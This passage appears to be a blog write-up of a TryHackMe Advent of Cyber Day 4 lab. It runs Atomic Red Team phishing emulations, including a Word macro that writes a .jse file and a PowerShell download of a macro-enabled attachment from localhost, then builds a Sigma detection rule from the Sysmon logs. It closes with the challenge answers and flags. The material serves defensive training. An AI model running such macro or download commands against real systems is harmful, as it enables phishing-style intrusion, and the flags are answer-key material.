+<span class="nx">$macrocode</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">   Open `</span><span class="dl">"</span><span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Users</span><span class="err">\</span><span class="nx">Public</span><span class="err">\</span><span class="nx">art</span><span class="p">.</span><span class="nx">jse</span><span class="s2">`" For Output As #1`</span><span class="nx">n</span>   <span class="nx">Write</span> <span class="err">#</span><span class="mi">1</span><span class="p">,</span> <span class="s2">`"WScript.Quit`</span><span class="dl">"</span><span class="s2">`n   Close #1`n   Shell`$ `</span><span class="dl">"</span><span class="nx">ping</span> <span class="mf">8.8</span><span class="p">.</span><span class="mf">8.8</span><span class="s2">`"`</span><span class="nx">n</span><span class="dl">"</span><span class="s2">
+Invoke-MalDoc -macroCode $macrocode -officeProduct </span><span class="dl">"</span><span class="nx">Word</span><span class="dl">"</span><span class="s2">
+
+Cleanup Commands:
+Command:
+Remove-Item #{jse_path} -ErrorAction Ignore
+Command (with inputs):
+Remove-Item C:</span><span class="se">\</span><span class="s2">Users</span><span class="se">\</span><span class="s2">Public</span><span class="se">\</span><span class="s2">art.jse -ErrorAction Ignore
+
+Dependencies:
+Description: Microsoft Word must be installed
+Check Prereq Command:
+try {
+  New-Object -COMObject </span><span class="dl">"</span><span class="err">#</span><span class="p">{</span><span class="nx">ms_product</span><span class="p">}.</span><span class="nx">Application</span><span class="dl">"</span><span class="s2"> | Out-Null
+  $process = </span><span class="dl">"</span><span class="err">#</span><span class="p">{</span><span class="nx">ms_product</span><span class="p">}</span><span class="dl">"</span><span class="s2">; if ( $process -eq </span><span class="dl">"</span><span class="nx">Word</span><span class="dl">"</span><span class="s2">) {$process = </span><span class="dl">"</span><span class="nx">winword</span><span class="dl">"</span><span class="s2">}
+  Stop-Process -Name $process
+  exit 0
+} catch { exit 1 }
+Check Prereq Command (with inputs):
+try {
+  New-Object -COMObject </span><span class="dl">"</span><span class="nx">Word</span><span class="p">.</span><span class="nx">Application</span><span class="dl">"</span><span class="s2"> | Out-Null
+  $process = </span><span class="dl">"</span><span class="nx">Word</span><span class="dl">"</span><span class="s2">; if ( $process -eq </span><span class="dl">"</span><span class="nx">Word</span><span class="dl">"</span><span class="s2">) {$process = </span><span class="dl">"</span><span class="nx">winword</span><span class="dl">"</span><span class="s2">}
+  Stop-Process -Name $process
+  exit 0
+} catch { exit 1 }
+Get Prereq Command:
+Write-Host </span><span class="dl">"</span><span class="nx">You</span> <span class="nx">will</span> <span class="nx">need</span> <span class="nx">to</span> <span class="nx">install</span> <span class="nx">Microsoft</span> <span class="err">#</span><span class="p">{</span><span class="nx">ms_product</span><span class="p">}</span> <span class="nx">manually</span> <span class="nx">to</span> <span class="nx">meet</span> <span class="k">this</span> <span class="nx">requirement</span><span class="dl">"</span><span class="s2">
+Get Prereq Command (with inputs):
+Write-Host </span><span class="dl">"</span><span class="nx">You</span> <span class="nx">will</span> <span class="nx">need</span> <span class="nx">to</span> <span class="nx">install</span> <span class="nx">Microsoft</span> <span class="nx">Word</span> <span class="nx">manually</span> <span class="nx">to</span> <span class="nx">meet</span> <span class="k">this</span> <span class="nx">requirement</span><span class="dl">"</span><span class="s2">
+[!!!!!!!!END TEST!!!!!!!]
+
+</span></code></pre></div></div>
+
+<p>The output above is clearly split up into multiple parts, each matching a test. Let’s examine what type of information is provided in a test. We will use the test we want to run as an example.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Key</th>
+      <th>Value</th>
+      <th>Description</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Technique</td>
+      <td>Phishing: Spearphishing Attachment T1566.001</td>
+      <td>The full name of the MITRE ATT&amp;CK technique that will be tested</td>
+    </tr>
+    <tr>
+      <td>Atomic Test Name</td>
+      <td>Download Macro-Enabled Phishing Attachment</td>
+      <td>A descriptive name of the type of test that will be executed</td>
+    </tr>
+    <tr>
+      <td>Atomic Test Number</td>
+      <td>1</td>
+      <td>A number is assigned to the test; we can use this in the command to specify which test we want to run.</td>
+    </tr>
+    <tr>
+      <td>Atomic Test GUID</td>
+      <td>114ccff9-ae6d-4547-9ead-4cd69f687306</td>
+      <td>A unique ID is assigned to this test; we can use this in the command to specify which test we want to run.</td>
+    </tr>
+    <tr>
+      <td>Description</td>
+      <td>This atomic test downloads a macro-enabled document from the Atomic Red Team GitHub repository, simulating an end-user clicking a phishing link to download the file. The file “PhishingAttachment.xlsm” is downloaded to the %temp% directory.</td>
+      <td>Provides a detailed explanation of what the test will do.</td>
+    </tr>
+    <tr>
+      <td>Attack commands</td>
+      <td><strong>Executor:</strong> powershell<strong>ElevationRequired:</strong> False<strong>Command:</strong> $url = ‘http://localhost/PhishingAttachment.xlsm’ Invoke-WebRequest -Uri $url -OutFile $env:TEMP.xlsm</td>
+      <td>This provides an overview of all the commands run during the test, including the executor of those commands and the required privileges. It also helps us determine where to look for artefacts in Windows Event Viewer.</td>
+    </tr>
+    <tr>
+      <td>Cleanup commands</td>
+      <td>Command: Remove-Item $env:TEMP.xlsm -ErrorAction Ignore</td>
+      <td>An overview of the commands executed to revert the machine back to its original state.</td>
+    </tr>
+    <tr>
+      <td>Dependencies</td>
+      <td>There are no dependencies required. \n</td>
+      <td>An overview of all required resources that must be present on the testing machine in order to execute the test</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><strong>Phishing: Spearphishing Attachment T1566.001 Emulated</strong></p>
+
+<p>Let’s continue and run the first test of T1566.001. Before running the emulation, we should ensure that all required resources are in place to conduct it successfully. To verify this, we can add the flag <code class="language-plaintext highlighter-rouge">-Checkprereq</code> to our command. The command should look something like this: <code class="language-plaintext highlighter-rouge">Invoke-AtomicTest T1566.001 -TestNumbers 1 -CheckPrereq</code>.</p>
+
+<p>This command will use the data included in the “dependencies” part of the test details to verify if all required resources are present. Looking at the test 1 dependencies of the T1566.001 Atomic, no additional resources are required. Run the same command for test 2, and it will state that Microsoft Word needs to be installed, as shown below:</p>
+
+<p>Administrator: Windows PowerShell</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">PS</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Users</span><span class="err">\</span><span class="nx">Administrator</span><span class="o">&gt;</span> <span class="nx">Invoke</span><span class="o">-</span><span class="nx">AtomicTest</span> <span class="nx">T1566</span><span class="p">.</span><span class="mi">001</span> <span class="o">-</span><span class="nx">TestNumbers</span> <span class="mi">2</span> <span class="o">-</span><span class="nx">CheckPrereq</span>
+<span class="nx">PathToAtomicsFolder</span> <span class="o">=</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Tools</span><span class="err">\</span><span class="nx">AtomicRedTeam</span><span class="err">\</span><span class="nx">atomics</span>
+
+<span class="nx">CheckPrereq</span><span class="dl">'</span><span class="s1">s for: T1566.001-2 Word spawned a command shell and used an IP address in the command line
+Prerequisites not met: T1566.001-2 Word spawned a command shell and used an IP address in the command line
+[*] Microsoft Word must be installed
+
+Try installing prereq</span><span class="dl">'</span><span class="nx">s</span> <span class="kd">with</span> <span class="nx">the</span> <span class="o">-</span><span class="nx">GetPrereqs</span> <span class="k">switch</span>
+
+</code></pre></div></div>
+
+<p>Now that we have verified the dependencies, let us continue with the emulation. Execute the following command to start the emulation: <code class="language-plaintext highlighter-rouge">Invoke-AtomicTest T1566.001 -TestNumbers 1</code> and you should get the following output:</p>
+
+<p>Executing Atomic Test T1566.001</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">PS</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Users</span><span class="err">\</span><span class="nx">Administrator</span><span class="o">&gt;</span> <span class="nx">Invoke</span><span class="o">-</span><span class="nx">AtomicTest</span> <span class="nx">T1566</span><span class="p">.</span><span class="mi">001</span> <span class="o">-</span><span class="nx">TestNumbers</span> <span class="mi">1</span>
+<span class="nx">PathToAtomicsFolder</span> <span class="o">=</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Tools</span><span class="err">\</span><span class="nx">AtomicRedTeam</span><span class="err">\</span><span class="nx">atomics</span>
+
+<span class="nx">Executing</span> <span class="nx">test</span><span class="p">:</span> <span class="nx">T1566</span><span class="p">.</span><span class="mi">001</span><span class="o">-</span><span class="mi">1</span> <span class="nx">Download</span> <span class="nx">Macro</span><span class="o">-</span><span class="nx">Enabled</span> <span class="nx">Phishing</span> <span class="nx">Attachment</span>
+<span class="nx">Done</span> <span class="nx">executing</span> <span class="nx">test</span><span class="p">:</span> <span class="nx">T1566</span><span class="p">.</span><span class="mi">001</span><span class="o">-</span><span class="mi">1</span> <span class="nx">Download</span> <span class="nx">Macro</span><span class="o">-</span><span class="nx">Enabled</span> <span class="nx">Phishing</span> <span class="nx">Attachment</span>
+
+</code></pre></div></div>
+
+<p>Based on the output, we can determine that the test was successfully executed. We can now analyse the logs in theWindows Event Viewer to find Indicators of Attack and Compromise.</p>
+
+<h2 id="detecting-the-atomic">Detecting the Atomic</h2>
+
+<p>Now that we have executed the T1566.001 Atomic, we can look for log entries that point us to this emulated attack. For this purpose, we will use the Windows Event Logs. This machine comes with <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon">Sysmon</a> installed. System Monitor (Sysmon) provides us with detailed information about process creation, network connections, and changes to file creation time.</p>
+
+<p>To make it easier for us to pick up the events created for this emulation, we will first start with cleaning up files from the previous test by running the command <code class="language-plaintext highlighter-rouge">Invoke-AtomicTest T1566.001 -TestNumbers 1 -cleanup</code>.</p>
+
+<p>Administrator: Windows PowerShell</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">PS</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Users</span><span class="err">\</span><span class="nx">Administrator</span><span class="o">&gt;</span> <span class="nx">Invoke</span><span class="o">-</span><span class="nx">AtomicTest</span> <span class="nx">T1566</span><span class="p">.</span><span class="mi">001</span> <span class="o">-</span><span class="nx">TestNumbers</span> <span class="mi">1</span> <span class="o">-</span><span class="nx">cleanup</span>
+</code></pre></div></div>
+
+<p>Now, we will clear the Sysmon event log:</p>
+
+<ul>
+  <li>Open up Event Viewer by clicking the icon in the taskbar, or searching for it in the Start Menu.</li>
+  <li>Navigate to <code class="language-plaintext highlighter-rouge">Applications and Services =&gt; Microsoft =&gt; Windows =&gt; Sysmon =&gt; Operational</code> on the left-hand side of the screen.</li>
+  <li>Right-click <code class="language-plaintext highlighter-rouge">Operational</code> on the left-hand side of the screen and click <strong>Clear Log</strong>. Click <strong>Clear</strong> when the popup shows.</li>
+</ul>
+
+<p>Now that we have cleaned up the files and the sysmon logs, let us run the emulation again by issuing the command <code class="language-plaintext highlighter-rouge">Invoke-AtomicTest T1566.001 -TestNumbers 1</code>.</p>
+
+<p>Administrator: Windows PowerShell</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">PS</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Users</span><span class="err">\</span><span class="nx">Administrator</span><span class="o">&gt;</span> <span class="nx">Invoke</span><span class="o">-</span><span class="nx">AtomicTest</span> <span class="nx">T1566</span><span class="p">.</span><span class="mi">001</span> <span class="o">-</span><span class="nx">TestNumbers</span> <span class="mi">1</span>
+<span class="nx">PathToAtomicsFolder</span> <span class="o">=</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Tools</span><span class="err">\</span><span class="nx">AtomicRedTeam</span><span class="err">\</span><span class="nx">atomics</span>
+
+<span class="nx">Executing</span> <span class="nx">test</span><span class="p">:</span> <span class="nx">T1566</span><span class="p">.</span><span class="mi">001</span><span class="o">-</span><span class="mi">1</span> <span class="nx">Download</span> <span class="nx">Macro</span><span class="o">-</span><span class="nx">Enabled</span> <span class="nx">Phishing</span> <span class="nx">Attachment</span>
+<span class="nx">Done</span> <span class="nx">executing</span> <span class="nx">test</span><span class="p">:</span> <span class="nx">T1566</span><span class="p">.</span><span class="mi">001</span><span class="o">-</span><span class="mi">1</span> <span class="nx">Download</span> <span class="nx">Macro</span><span class="o">-</span><span class="nx">Enabled</span> <span class="nx">Phishing</span> <span class="nx">Attachment</span>
+
+</code></pre></div></div>
+
+<p>Next, go to the Event Viewer and right-click on the <strong>Operational</strong> log on the left-hand side of the screen and then click on <strong>Refresh</strong>. There should be new events related to the emulated attack. Now sort the table on the Date and Time column to order the events chronologically (oldest first). The first two events of the list are tests that Atomic executes for every emulation. We are interested in 2 events that detail the attack:</p>
+
+<ul>
+  <li>First, a process was created for PowerShell to execute the following command: <code class="language-plaintext highlighter-rouge">"powershell.exe" &amp; {$url = 'http://localhost/PhishingAttachment.xlsm' Invoke-WebRequest -Uri $url -OutFile $env:TEMP\PhishingAttachment.xlsm}</code>.</li>
+  <li>Then, a file was created with the name PhishingAttachment.xlsm.</li>
+</ul>
+
+<p>Click on each event to see the details. When you select an event, you should see a detailed overview of all the data collected for that event. Click on the <strong>Details</strong> tab to show all the <strong>EventData</strong> in a readable format. Let us take a look at the details of these events below. The data highlighted is valuable for incident response and creating alerting rules.</p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/66c44fd9733427ea1181ad58/room-content/66c44fd9733427ea1181ad58-1730736581670.png" alt="The results of executing the Atomic Test T1566.001 on the Windows Event Viewer." /></p>
+
+<p>Navigate to the directory <code class="language-plaintext highlighter-rouge">C:\Users\Administrator\AppData\Local\Temp\</code>, and open the file <code class="language-plaintext highlighter-rouge">PhishingAttachment.txt</code>. The flag included is the answer to question 1. Make sure to answer the question now, as the cleanup command will delete this file. \n</p>
+
+<p>Let’s clean up the artefacts from our spearphishing emulation. Enter the command <code class="language-plaintext highlighter-rouge">Invoke-AtomicTest T1566.001-1 -cleanup</code>.</p>
+
+<p>Now that we know which artefacts were created during this spearphishing emulation, we can use them to create custom alerting rules. In the next section, we will explore this topic further.</p>
+
+<h2 id="alerting-on-the-atomic">Alerting on the Atomic</h2>
+
+<p>In the previous paragraph, we found multiple indicators of compromise through the Sysmon event log. We can use this information to create detection rules to include in our EDR, SIEM, IDS, etc. These tools offer functionalities that allow us to import custom detection rules. There are several detection rule formats, including Yara, Sigma, Snort, and more. Let’s look at how we can implement the artefacts related to T1566.001 to create a custom Sigma rule.</p>
+
+<p>Two events contained possible indicators of compromise. Let’s focus on the event that contained the <code class="language-plaintext highlighter-rouge">Invoke-WebRequest</code> command line:</p>
+
+<p><code class="language-plaintext highlighter-rouge">"powershell.exe" &amp; {$url = 'http://localhost/PhishingAttachment.xlsm' Invoke-WebRequest -Uri $url -OutFile $env:TEMP\PhishingAttachment.xlsm}"</code></p>
+
+<p>We can use multiple parts of this artefact to include in our custom Sigma rule.</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">Invoke-WebRequest</code>: It is not common for this command to run from a script behind the scenes.</li>
+  <li><code class="language-plaintext highlighter-rouge">$url = 'http://localhost/PhishingAttachment.xlsm'</code>: Attackers often use a specific malicious domain to host their payloads. Including the malicious URL in the Sigma rule could help us detect that specific URL.</li>
+  <li><code class="language-plaintext highlighter-rouge">PhishingAttachment.xlsm</code>: This is the malicious payload downloaded and saved on our system. We can include its name in the Sigma rule as well.</li>
+</ul>
+
+<p>Combining all these pieces of information in a Sigma rule would look something like this:</p>
+
+<p>PowerShell Invoke-WebRequest Sigma Rule</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">title</span><span class="p">:</span> <span class="nx">Detect</span> <span class="nx">PowerShell</span> <span class="nx">Invoke</span><span class="o">-</span><span class="nx">WebRequest</span> <span class="nx">and</span> <span class="nx">File</span> <span class="nx">Creation</span> <span class="k">of</span> <span class="nx">PhishingAttachment</span><span class="p">.</span><span class="nx">xlsm</span>
+  <span class="nx">id</span><span class="p">:</span> <span class="mi">1</span>
+  <span class="nx">description</span><span class="p">:</span> <span class="nx">Detects</span> <span class="nx">the</span> <span class="nx">usage</span> <span class="k">of</span> <span class="nx">Invoke</span><span class="o">-</span><span class="nx">WebRequest</span> <span class="nx">to</span> <span class="nx">download</span> <span class="nx">PhishingAttachment</span><span class="p">.</span><span class="nx">xlsm</span> <span class="nx">and</span> <span class="nx">the</span> <span class="nx">creation</span> <span class="k">of</span> <span class="nx">the</span> <span class="nx">file</span> <span class="nx">PhishingAttachment</span><span class="p">.</span><span class="nx">xlsm</span><span class="p">.</span>
+ <span class="nx">status</span><span class="p">:</span> <span class="nx">experimental</span>
+  <span class="nx">author</span><span class="p">:</span> <span class="nx">TryHackMe</span>
+  <span class="nx">logsource</span><span class="p">:</span>
+    <span class="nx">category</span><span class="p">:</span> <span class="nx">process_creation</span>
+    <span class="nx">product</span><span class="p">:</span> <span class="nx">windows</span>
+    <span class="nx">service</span><span class="p">:</span> <span class="nx">sysmon</span>
+  <span class="nx">detection</span><span class="p">:</span>
+   <span class="nx">selection_invoke_webrequest</span><span class="p">:</span>
+      <span class="nx">EventID</span><span class="p">:</span> <span class="mi">1</span>
+      <span class="nx">CommandLine</span><span class="o">|</span><span class="nx">contains</span><span class="p">:</span>
+        <span class="o">-</span> <span class="dl">'</span><span class="s1">Invoke-WebRequest</span><span class="dl">'</span>
+        <span class="o">-</span> <span class="dl">'</span><span class="s1">http://localhost/PhishingAttachment.xlsm</span><span class="dl">'</span>
+
+    <span class="nx">selection_file_creation</span><span class="p">:</span>
+      <span class="nx">EventID</span><span class="p">:</span> <span class="mi">11</span>  <span class="err">#</span> <span class="nx">Sysmon</span> <span class="nx">Event</span> <span class="nx">ID</span> <span class="k">for</span> <span class="nx">File</span> <span class="nx">Creation</span>
+      <span class="nx">TargetFilename</span><span class="o">|</span><span class="nx">endswith</span><span class="p">:</span> <span class="dl">'</span><span class="se">\</span><span class="s1">PhishingAttachment.xlsm</span><span class="dl">'</span>
+
+    <span class="nx">condition</span><span class="p">:</span> <span class="nx">selection_invoke_webrequest</span> <span class="nx">or</span> <span class="nx">selection_file_creation</span>
+  <span class="nx">falsepositives</span><span class="p">:</span>
+    <span class="o">-</span> <span class="nx">Legitimate</span> <span class="nx">administration</span> <span class="nx">activity</span> <span class="nx">may</span> <span class="nx">use</span> <span class="nx">Invoke</span><span class="o">-</span><span class="nx">WebRequest</span><span class="p">,</span> <span class="nx">and</span> <span class="nx">legitimate</span> <span class="nx">Excel</span> <span class="nx">files</span> <span class="nx">may</span> <span class="nx">be</span> <span class="nx">created</span> <span class="kd">with</span> <span class="nx">similar</span> <span class="nx">names</span><span class="p">.</span>
+  <span class="nx">level</span><span class="p">:</span> <span class="nx">high</span>
+  <span class="nx">tags</span><span class="p">:</span>
+    <span class="o">-</span> <span class="nx">attack</span><span class="p">.</span><span class="nx">t1071</span><span class="p">.</span><span class="mi">001</span>   <span class="err">#</span> <span class="nx">Web</span> <span class="nx">Service</span> <span class="o">-</span> <span class="nx">Application</span> <span class="nx">Layer</span> <span class="nx">Protocol</span>
+    <span class="o">-</span> <span class="nx">attack</span><span class="p">.</span><span class="nx">t1059</span><span class="p">.</span><span class="mi">001</span>   <span class="err">#</span> <span class="nx">PowerShell</span>
+    <span class="o">-</span> <span class="nx">attack</span><span class="p">.</span><span class="nx">t1105</span>       <span class="err">#</span> <span class="nx">Ingress</span> <span class="nx">Tool</span> <span class="nx">Transfer</span>
+    <span class="o">-</span> <span class="nx">attack</span><span class="p">.</span><span class="nx">t1566</span><span class="p">.</span><span class="mi">001</span>   <span class="err">#</span> <span class="nx">Spearphishing</span> <span class="nx">Attachment</span>
+
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">detection</code> part is where the effective detection is happening. We can see clearly the artefacts that we discovered during the emulation test. We can then import this rule into the main tools we use for alerts, such as the EDR, SIEM, XDR, and many more.</p>
+
+<p>Now that Glitch has shown us his intentions, let’s continue with his work and run an emulation for ransomware.</p>
+
+<h2 id="challenge">Challenge</h2>
+
+<p>As Glitch continues to prepare for SOC-mas and fortifies Wareville’s security, he decides to conduct an attack simulation that would mimic a ransomware attack across the environment. He is unsure of the correct detection metrics to implement for this test and asks you for help. Your task is to identify the correct atomic test to run that will take advantage of <strong>a command and scripting interpreter</strong>, conduct the test, and extract valuable artefacts that would be used to craft a detection rule.</p>
+
+<p>Answer the questions below</p>
+
+<p>:::tip
+What was the flag found in the .txt file that is found in the same directory as the PhishingAttachment.xslm artefact?</p>
+
+<p>:::</p>
+
+<p>THM{GlitchTestingForSpearphishing}</p>
+
+<p>:::tip
+What ATT&amp;CK technique ID would be our point of interest?</p>
+
+<p>:::</p>
+
+<p>T1059</p>
+
+<p>:::tip
+What ATT&amp;CK subtechnique ID focuses on the Windows Command Shell?</p>
+
+<p>:::</p>
+
+<p>T1059.003</p>
+
+<p>:::tip
+What is the name of the Atomic Test to be simulated?</p>
+
+<p>:::</p>
+
+<p>Simulate BlackByte Ransomware Print Bombing</p>
+
+<p>:::tip
+What is the name of the file used in the test?</p>
+
+<p>:::</p>
+
+<p>Wareville_Ransomware.txt</p>
+
+<p>:::tip
+What is the flag found from this Atomic Test?</p>
+
+<p>:::</p>
+
+<p>THM{R2xpdGNoIGlzIG5vdCB0aGUgZW5lbXk=}</p>
+
+<p>Learn more about the <a href="https://tryhackme.com/r/room/atomicredteam">Atomic Red Team</a> via the linked room.</p>
+
+  </article>
+  
+    <div class="post-share">
+  <div class="post-date">Feel free to share!</div>
+  <div class="sharing-icons">
+    <a href="https://twitter.com/intent/tweet?text=Try Hackme Advent of Cyber - Day 4&amp;url=/Day4" target="_blank"><i class="fa fa-twitter" aria-hidden="true"></i></a>
+    <a href="https://www.facebook.com/sharer/sharer.php?u=/Day4&amp;title=Try Hackme Advent of Cyber - Day 4" target="_blank"><i class="fa fa-facebook" aria-hidden="true"></i></a>
+  </div>
+</div>
+
+  
+  
+    <div class="related">
+  <h2>You may also enjoy...</h2>
+  
+  <ul class="related-posts">
+    
+      
+        
+          <li>
+            <h3>
+              <a href="/Day7">
+                <div class="related-thumbnail">
+                  
+                    <img src="http://localhost:4000/assets/img/Day7-logo.png">
+                  
+                </div>
+                <div class="related-title">
+                  Try Hackme Advent of Cyber - Day 7
+                </div>
+                <!--<small>December 7, 2024</small>-->
+              </a>
+            </h3>
+          </li>
+          
+        
+      
+        
+          <li>
+            <h3>
+              <a href="/Day6">
+                <div class="related-thumbnail">
+                  
+                    <img src="http://localhost:4000/assets/img/Day6-logo.png">
+                  
+                </div>
+                <div class="related-title">
+                  Try Hackme Advent of Cyber - Day 6
+                </div>
+                <!--<small>December 6, 2024</small>-->
+              </a>
+            </h3>
+          </li>
+          
+        
+      
+    
+      
+        
+        
+      
+        
+        
+      
+    
+  </ul>
+</div>
+
+  
+  
+    <section class="disqus">
+  <div id="disqus_thread"></div>
+  <script type="text/javascript">
+    var disqus_shortname = "millennial-3";
+    var disqus_identifier = "/Day4";
+    (function() {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+  </script>
+  <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+  <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+
+  
+</div>
+
+      </div>
+      <footer class="footer">
+  
+    <a href="https://twitter.com/mberger" class="menu-link" target="_blank"><i class="fa fa-twitter" aria-hidden="true"></i></a>
+  
+    <a href="feed.xml" class="menu-link" target="_blank"><i class="fa fa-rss-square" aria-hidden="true"></i></a>
+  
+  <div class="footer-description"><a href="/">THM Advent of Cyber 2024 | a minimalist Jekyll theme for running a blog or publication by Michael</a></div>
+</footer>
+
+    </div>
+  </body>
+</html>
